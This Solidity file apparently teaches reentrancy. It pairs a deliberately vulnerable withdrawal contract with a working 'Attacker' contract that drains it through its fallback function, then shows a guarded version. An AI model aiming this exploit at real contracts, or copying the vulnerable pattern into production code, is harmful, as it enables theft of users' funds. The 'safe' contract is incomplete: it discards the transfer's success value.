pragma solidity ^0.8.0;

contract ReentrancyVulnerable {
    mapping(address => uint256) public balances;

    function Deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function Withdraw() public {
        uint256 balance = balances[msg.sender];
        require(balance > 0);

        (bool sent, ) = msg.sender.call{value: balance}("");
        require(sent);
        balances[msg.sender] = 0;
    }
}

contract Attacker {
    ReentrancyVulnerable reentrancyVulnerable;

    constructor(ReentrancyVulnerable _reentrancyVulnerable) {
        reentrancyVulnerable = _reentrancyVulnerable;
    }

    fallback() external payable {
        if (address(reentrancyVulnerable).balance >= 1 ether) {
            reentrancyVulnerable.Withdraw();
        }
    }

    function Attack() public payable {
        reentrancyVulnerable.Deposit{value: 1 ether}();
        reentrancyVulnerable.Withdraw();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract reentrancySafe {
    bool entered;
    mapping(address => uint256) balances;

    modifier reentrancyGuard() {
        require(!entered);
        entered = true;
        _;
        entered = false;
    }

    //use the reentrancy guard modifier
    function Withdraw() public reentrancyGuard {
        uint256 balance = balances[msg.sender];
        require(balance > 0);
        //update state by setting caller's balance to zero before transferring ether
        balances[msg.sender] = 0;

        msg.sender.call{value: balance}("");
    }
}
